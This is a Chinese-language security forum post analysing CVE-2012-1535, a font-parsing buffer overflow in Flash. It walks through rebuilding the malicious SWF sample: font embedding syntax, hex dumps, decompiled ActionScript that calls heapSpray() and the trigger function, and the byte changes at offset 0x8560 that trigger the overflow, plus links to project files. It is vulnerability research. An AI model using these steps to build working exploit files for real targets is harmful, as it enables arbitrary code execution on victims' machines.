
通过 `Embed` 这种方法来嵌入一个字体文件，按照这种语法自己照着写一份，如下：

```
[Embed(source = 'rexliafree.ttf', fontName = 'PSpop',mimeType = 'application/x-font')]

	public static const FontClass :Class;
```

同时把字体文件拷贝到 Flash 工程的 `Src` 目录下，可编译通过。通过使用 Flash 解压缩工具对生成的 Flash `Swf` 解压后，使用 `010editor` 打开发现确实嵌入了字体文件，如下：

```
0210h: C9 0A 46 6C 65 78 34 41 70 70 00 FF 16 C1 C3 00  ?Flex4App..撩. 

0220h: 00 01 00 04 50 53 70 6F 70 00 4F 54 54 4F 00 0C  ....PSpop.OTTO.. 

0230h: 00 80 00 03 00 40 43 46 46 20 7B 82 BD 3A 00 00  .€...@CFF {偨:.. 

0240h: 00 CC 00 00 5F 2C 47 50 4F 53 AD 50 77 A4 00 00  .?._,GPOS璓w?. 

0250h: 5F F8 00 00 18 B8 47 53 55 42 A5 13 A4 0F 00 00  _?..窯SUB??.. 

0260h: 78 B0 00 00 01 88 4F 53 2F 32 66 18 51 6C 00 00  x?..圤S/2f.Ql.. 

0270h: 7A 38 00 00 00 60 63 6D 61 70 41 FB 82 FA 00 00  z8...`cmapA麄?. 

0280h: 7A 98 00 00 02 44 68 65 61 64 EC 98 85 B2 00 00  z?..Dhead鞓叢.. 

0290h: 7C DC 00 00 00 36 68 68 65 61 08 3A 05 28 00 00  |?..6hhea.:.(.. 

02A0h: 7D 14 00 00 00 24 68 6D 74 78 05 95 38 14 00 00  }....$hmtx.?... 

02B0h: 7D 38 00 00 06 0C 6B 65 72 6E A4 66 AE 58 00 00  }8....kern甔.. 

02C0h: 83 44 00 00 3D EC 6D 61 78 70 01 83 50 00 00 00  僁..=靘axp.働... 

02D0h: C1 30 00 00 00 06 6E 61 6D 65 67 04 F4 8E 00 00  ?....nameg.魩.. 

02E0h: C1 38 00 00 02 5E 70 6F 73 74 FF B8 00 32 00 00  ?...^post?2.. 

02F0h: C3 98 00 00 00 20 01 00 04 04 00 01 04 00 00 00  脴... .......... 

0300h: 01 00 00 00 13 52 65 78 6C 69 61 46 72 65 65 2D  .....RexliaFree- 

0310h: 52 65 67 75 6C 61 72 00 01 04 00 00 00 01 00 00  Regular......... 
```

与样本 `Swf` 文件进行比较就会发现，这部分数据都是一样的，除了某个关键点，就是触发漏洞的关键点，这个时候自己还是不知道，只有接着进行样本构造还原，尽量保证文件格式和数据上与样本 `Swf` 文件保持一致，这样就能知道样本是如何构造的。

### 加入 AS 代码
接下来继续构造，既然字体嵌入进去了，就尝试把其他的 AS 代码加入到 Flash 工程中来，简单来说就是把反编译的 AS 文件添加到自己创建的 Flash 工程中。

接下来处理这一句代码：

```
 this.FontClass = Main_FontClass;
```

不明白这段代码是如何产生的？根据之前找到的数据也没有相关的提示，其他野没有好的办法，尝试把之前编译的 `Swf` 文件使用硕思进行反编译，得到如下结果：

```
package 

{

    import flash.display.*;

    import flash.utils.*;


    public class Flex4App extends Sprite

    {

        public var kbArray:ByteArray;

        public var mbArray:ByteArray;

        public var tmpArray:ByteArray;

        public var allocs:Array;

        public static const FontClass:Class = Flex4App_FontClass;


        public function Flex4App()

        {

            return;

        }// end function


    }

}
```

注意到这句代码没有：

```
public static const FontClass:Class = Flex4App_FontClass;
```

默认情况下就能反编译出此句代码，所以 `this.FontClass = Main_FontClass;` 这句代码是可以省略的。

反编译代码的主函数如下：

```
 public function Main() : void

        {

            this.FontClass = Main_FontClass;

            this.heapSpray();

            this.TextBlock_createTextLineExample();

            return;

        }// end function
```

可以看出是在堆填充 `heapSpray()`，执行 `TextBlock_createTextLineExample()` 函数触发漏洞。把相应的代码拷贝到 Flash 工程并删除所有的 `this.` 进行编译，得到一个 `Swf` 文件，解压缩，然后与样本 `Swf` 进行比较。

这时发现一个很神奇的神奇现象,排除一些文件数据结构上的不同之外大部分数据竟然都是相同的，如图：

![](https://bbs.kanxue.com/upload/attach/201210/162756_ktkrc58zkiykfrg.png)

图中灰色部分就是相同的部分，一目了然。接着往下分析，找到了下图的不同之处。

![](https://bbs.kanxue.com/upload/attach/201210/162756_phylwbsquafnmlk.png)

```
样本.swf

8560h: 32 00 8D 00 26 00 00 00 00 00 00 00 00 00 01 00  2.?&........... 
8570h: 00 10 00 00 00 1E 0C FF E8 30 00 00 0B 0D DA 00  .......?....?
自己构造.swf

8560h: 32 00 8D 00 26 00 00 00 00 00 00 00 00 00 00 00  2.?&........... 
8570h: 01 00 00 3D E8 00 01 0A 4F 30 00 00 0B 0D DA 00  ...=?..O0....?
```

这里是不是构造的关键点呢，即修改之后就能触发这个漏洞？

回头再来看看这个漏洞的描述：Flash 在解析嵌入的字体文件时触发一个缓冲区溢出漏洞，成功利用此漏洞可以执行任意代码。通过对文件结构的分析可以看出来，偏移 `0x8560` 是字体数据，既然如此，就尝试修改之，与样本 `Swf` 文件一致。

这样就手动构造出来了初始样本，有利于理解漏洞的成因，也有助于分析攻击者构造漏洞利用的过程。

### Flash Builder 4.6 工程源码
`Flex4App.rar` https://bbs.kanxue.com/attach-download-72547.htm

`CVE-2012-1535 Flash解析特殊格式字体漏洞样本构造分享.doc` https://bbs.kanxue.com/attach-download-72548.htm

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- `1.png` （18.61kb，10次下载）
- `2.png` （22.12kb，5次下载）
- `Flex4App.rar` （50.15kb，100次下载）
- `CVE-2012-1535 Flash解析特殊格式字体漏洞样本构造分享.doc` （103.50kb，132次下载）
